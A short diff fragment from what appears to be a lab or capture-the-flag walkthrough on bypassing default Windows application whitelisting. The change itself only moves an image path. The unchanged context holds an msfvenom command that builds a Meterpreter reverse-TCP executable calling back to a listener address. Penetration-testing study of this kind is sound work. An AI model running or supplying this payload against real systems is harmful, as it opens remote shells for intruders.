@@ -22,5 +22,5 @@ Default rules whitelist certain directories: `C:\Windows\System32\spool\drivers\
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.67.108.97 LPORT=8888 -f exe -o shell.exe
 
-![Shell](/images/corp-101.png)  
+![Shell](/assets/corp-101.png)  
 
